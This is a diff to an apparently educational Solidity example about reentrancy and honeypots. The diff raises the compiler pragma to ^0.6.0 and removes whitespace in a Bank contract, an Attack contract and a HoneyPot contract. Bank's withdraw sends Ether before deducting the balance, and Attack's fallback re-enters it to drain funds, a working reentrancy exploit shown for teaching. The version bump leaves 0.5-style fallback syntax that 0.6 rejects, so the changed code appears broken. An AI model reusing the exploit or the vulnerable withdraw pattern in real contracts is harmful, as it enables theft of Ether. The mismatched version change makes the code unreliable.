@@ -1,4 +1,4 @@
-pragma solidity ^0.5.16;
+pragma solidity ^0.6.0;
 
 /*
 Bank is a contract that calls Logger to log events.
@@ -36,12 +36,12 @@ contract Bank {
 
     function withdraw(uint _amount) public {
         require(_amount <= balances[msg.sender], "Insufficient funds");
-        
+
         (bool sent, ) = msg.sender.call.value(_amount)("");
         require(sent, "Failed to send Ether");
-        
+
         balances[msg.sender] -= _amount;
-        
+
         logger.log(msg.sender, _amount, "Withdraw");
     }
 }
@@ -57,17 +57,17 @@ contract Logger {
 // Hacker tries to drain the Ethers stored in Bank by reentrancy.
 contract Attack {
     Bank bank;
-    
+
     constructor(Bank _bank) public {
         bank = Bank(_bank);
     }
-    
+
     function () external payable {
         if (address(bank).balance >= 1 ether) {
             bank.withdraw(1 ether);
         }
     }
-    
+
     function attack() public payable {
         bank.deposit.value(1 ether)();
         bank.withdraw(1 ether);
@@ -87,7 +87,7 @@ contract HoneyPot {
             revert("It's a trap");
         }
     }
-    
+
     // Function to compare strings using keccak256
     function equal(string memory _a, string memory _b)
         public pure returns (bool)
